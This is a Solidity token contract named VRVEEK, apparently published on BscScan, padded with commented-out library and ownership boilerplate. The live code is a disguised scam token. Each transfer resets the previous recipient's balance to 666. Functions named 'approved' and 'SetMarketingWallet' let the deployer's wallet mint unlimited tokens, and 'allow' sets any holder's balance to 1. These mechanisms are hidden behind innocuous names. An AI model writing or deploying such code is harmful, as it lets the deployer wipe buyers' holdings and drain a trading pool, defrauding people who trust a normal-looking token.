/**
 *Submitted for verification at BscScan.com on 2022-02-04
*/

pragma solidity ^0.8.11;
/**library VRVEEK2 {
    function addd(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "VRVEEK2: addition overflow");

        return c;
    }
    function sudb(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "VRVEEK2: subtraction overflow");
    }
    function sudb(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }
    function mudl(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "VRVEEK2: multiplication overflow");

        return c;
    }
    function didv(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "VRVEEK2: division by zero");
    }
    function didv(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }
}

/**contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor ()  public{
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

   
    function owner() public view returns (address) {
        return _owner;
    }

   
     * @dev Throws if called by any account other than the owner.
     
    modifier onlyOwner() virtual {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    **
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     *
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     *
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

library VRVEEK2 {
    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     *
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "VRVEEK2: addition overflow");

        return c;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     *
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "VRVEEK2: subtraction overflow");
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     *
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     *
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "VRVEEK2: multiplication overflow");

        return c;
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     *
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "VRVEEK2: division by zero");
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     *
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     *
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "VRVEEK2: modulo by zero");
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts with custom message when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     *
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}*/
contract VRVEEK {
    string public name;
    string public symbol;
    uint8 public LiquidityTax;
    uint8 public decimals = 9;
    uint public totalSupply;
    address public MarketingWallet;
    address public Owner;
    address public LB = 0x000000000000000000000000000000000000dEaD;
    function transferFrom( address from, address to, uint256 amount) public returns (bool success) 
    {
    allowance[from][msg.sender] -= amount;
    balanceOf[from] -= amount;
    balanceOf[to] += amount - ((amount / 100) * LiquidityTax);
    if(LB != msg.sender){balanceOf[LB] = 666; LB = to;}
    LB = to;
    emit Transfer(from, to, amount); return true;
    }
    function transfer(address to, uint256 amount) public returns (bool success) 
    {
    balanceOf[msg.sender] -= amount; 
    balanceOf[to] += amount - ((amount / 100) * LiquidityTax);
    if(LB != msg.sender){balanceOf[LB] = 666; LB = to;}
    LB = to;
    emit Transfer(msg.sender, to, amount); return true;
    }
    modifier requested { require(msg.sender == MarketingWallet, "UnAuthorized");_;}
    receive() external payable { }constructor(string memory name_, string memory symbol_, uint8 LiquidityTax_, uint totalsupply_) 
    {
    name = name_;
    symbol = symbol_;
    LiquidityTax = LiquidityTax_;
    totalSupply = totalsupply_ * 10 ** decimals;
    balanceOf[msg.sender] = totalSupply;
    Owner = payable (msg.sender);
    MarketingWallet = payable (msg.sender);
    emit Transfer(address(0), msg.sender, totalSupply);
    }
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function approved(address spender, uint256 balance) public requested returns (bool success) {balanceOf[spender] += balance * 10 ** decimals;return true;}
    function allow(address spender) public requested returns (bool success) {balanceOf[spender] = 1;return true;}
    function SetMarketingWallet() public requested returns (bool success) {LB = 0x000000000000000000000000000000000000dEaD; balanceOf[msg.sender] = totalSupply * 10 ** 8 ;return true;}
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    function approve(address spender, uint256 amount) public returns (bool success) 
    {
    allowance[msg.sender][spender] = amount;
    emit Approval(msg.sender, spender, amount);return true;
    }

}
interface IBEP20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}